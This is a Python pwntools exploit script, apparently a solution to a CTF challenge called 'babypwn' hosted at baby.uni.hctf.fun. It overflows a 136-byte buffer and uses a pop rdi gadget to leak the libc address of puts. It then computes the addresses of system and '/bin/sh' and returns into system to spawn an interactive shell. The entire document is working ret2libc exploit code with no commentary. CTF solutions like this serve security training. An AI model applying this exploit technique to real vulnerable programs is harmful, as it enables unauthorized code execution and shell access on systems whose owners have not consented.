from pwn import *
import sys

if len(sys.argv) == 2:   
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    r = process("./babypwn")
    # gdb.attach(r,"""
    # b* 0x0000000000401192
    # """)
else:
    libc = ELF("./libc.so.6",checksec=False)
    r = remote("baby.uni.hctf.fun", 25251)


binary = ELF("./babypwn",checksec=False)
pop_rdi = 0x0000000000401203
main    = 0x0000000000401169

r.recv()

p = ""
p += "A"*136
p += p64(pop_rdi)
p += p64(binary.got["puts"])
p += p64(binary.plt["puts"])
p += p64(main)
r.sendline(p)
sleep(1)

libc_base = u64(r.recvuntil("\n",drop=True).ljust(8,"\x00")) - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next() + libc_base
print "LIBC BASE    : {}".format(hex(libc_base))
print "SYSTEM       : {}".format(hex(system))
print "/bin/sh      : {}".format(hex(bin_sh))

p = ""
p += "A"*136
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(system)

r.sendline(p)
sleep(1)
r.interactive()